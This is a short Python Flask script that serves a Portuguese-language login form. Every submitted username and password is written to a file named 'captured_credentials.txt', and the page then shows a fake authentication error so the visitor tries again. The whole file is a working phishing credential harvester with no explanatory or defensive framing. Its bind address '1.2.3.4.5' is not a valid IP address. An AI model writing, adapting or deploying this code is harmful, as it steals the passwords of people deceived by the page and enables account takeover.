from flask import Flask, render_template_string, request
import os

app = Flask(__name__)

login_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST">
        <label>Usuário:</label><br>
        <input type="text" name="username"><br>
        <label>Senha:</label><br>
        <input type="password" name="password"><br><br>
        <input type="submit" value="Entrar">
    </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with open('captured_credentials.txt', 'a') as f:
            f.write(f'Usuário: {username}, Senha: {password}\n')

        return "<h3>Erro de autenticação. Tente novamente.</h3>"

    return render_template_string(login_page)

if __name__ == '__main__':
    app.run(host='1.2.3.4.5', port=1000)
